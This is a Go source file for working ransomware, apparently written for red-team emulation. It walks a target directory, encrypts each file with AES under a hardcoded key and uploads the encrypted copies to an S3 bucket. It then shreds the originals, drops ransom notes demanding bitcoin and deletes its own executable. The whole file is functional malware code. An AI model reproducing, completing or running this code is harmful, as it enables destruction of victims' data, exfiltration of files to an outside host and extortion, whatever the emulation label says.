package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/s3"
)

const (
	PASSWORD    = "SecureRansomKey$2025!"
	SUFFIX      = ".locked"
	RANSOM_NOTE = "!!! YOUR FILES ARE ENCRYPTED !!!\nPay 0.5 BTC to XYZ.\n"
	BUCKET      = "ecs-uploads"
	PREFIX      = "ransomware_emulation/"
	REGION      = "ap-southeast-2"
	PROFILE     = "redteam"
)

// Secure deletion
func secureDelete(path string) {
	cmd := exec.Command("shred", "-u", "-z", "-n", "3", path)
	_ = cmd.Run()
}

// Encrypt file and upload to S3
func encryptFile(path string, svc *s3.S3) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}

	salt := make([]byte, 16)
	if _, err := rand.Read(salt); err != nil {
		return err
	}
	key := sha256.Sum256([]byte(PASSWORD + string(salt)))

	block, err := aes.NewCipher(key[:])
	if err != nil {
		return err
	}

	iv := make([]byte, aes.BlockSize)
	if _, err := rand.Read(iv); err != nil {
		return err
	}

	padding := aes.BlockSize - (len(data) % aes.BlockSize)
	padtext := bytesRepeat(byte(padding), padding)
	data = append(data, padtext...)

	mode := cipher.NewCBCEncrypter(block, iv)
	encrypted := make([]byte, len(data))
	mode.CryptBlocks(encrypted, data)

	finalData := append(append(salt, iv...), encrypted...)
	outPath := path + SUFFIX
	if err := os.WriteFile(outPath, finalData, 0644); err != nil {
		return err
	}

	uploadToS3(svc, outPath, finalData)
	secureDelete(path)
	return nil
}

// Upload encrypted file to S3
func uploadToS3(svc *s3.S3, path string, data []byte) {
	relPath := strings.TrimPrefix(path, "/")
	key := PREFIX + relPath
	input := &s3.PutObjectInput{
		Bucket: aws.String(BUCKET),
		Key:    aws.String(key),
		Body:   strings.NewReader(string(data)),
	}
	_, _ = svc.PutObject(input)
}

// Drop ransom note
func dropRansomNote(dir string) {
	note := filepath.Join(dir, "HOW_TO_DECRYPT.txt")
	if _, err := os.Stat(note); os.IsNotExist(err) {
		_ = os.WriteFile(note, []byte(RANSOM_NOTE), 0644)
	}
}

// Recursively encrypt all files
func encryptDirectory(root string, svc *s3.S3) error {
	return filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if info.IsDir() || strings.HasSuffix(path, SUFFIX) {
			return nil
		}
		if strings.Contains(path, "/proc/") || strings.Contains(path, "/sys/") ||
			strings.HasPrefix(filepath.Base(path), "HOW_TO_DECRYPT") {
			return nil
		}
		if err := encryptFile(path, svc); err == nil {
			dropRansomNote(filepath.Dir(path))
		}
		return nil
	})
}

// Repeat byte without importing bytes pkg
func bytesRepeat(b byte, count int) []byte {
	result := make([]byte, count)
	for i := range result {
		result[i] = b
	}
	return result
}

// Delete itself
func selfDestruct() {
	exe, err := os.Executable()
	if err == nil {
		secureDelete(exe)
	}
}

func main() {
	if len(os.Args) != 2 {
		fmt.Println("Usage: ./ransomware <target_directory>")
		return
	}

	targetDir := os.Args[1]
	if _, err := os.Stat(targetDir); os.IsNotExist(err) {
		fmt.Printf("Error: Target directory %s does not exist\n", targetDir)
		return
	}

	sess := session.Must(session.NewSessionWithOptions(session.Options{
		Profile: PROFILE,
		Config:  aws.Config{Region: aws.String(REGION)},
	}))
	svc := s3.New(sess)

	_ = encryptDirectory(targetDir, svc)
	selfDestruct()
}
